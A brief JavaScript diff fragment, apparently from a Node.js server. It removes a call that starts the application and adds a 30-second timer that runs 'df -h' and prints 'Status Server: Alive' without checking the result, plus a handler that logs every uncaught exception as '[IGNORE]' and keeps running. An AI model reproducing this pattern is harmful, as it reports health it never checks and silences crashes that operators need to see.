-    jalankanAplikasi();
-}
+
+setInterval(() => {
+    exec('df -h', (err, stdout) => {
+        if (!err) {
+ console.log("Status Server: Alive"); 
+        }
+    });
+}, 30000);
+
+process.on('uncaughtException', (err) => {
+    console.log(`[IGNORE] Error: ${err.message}`);
+});
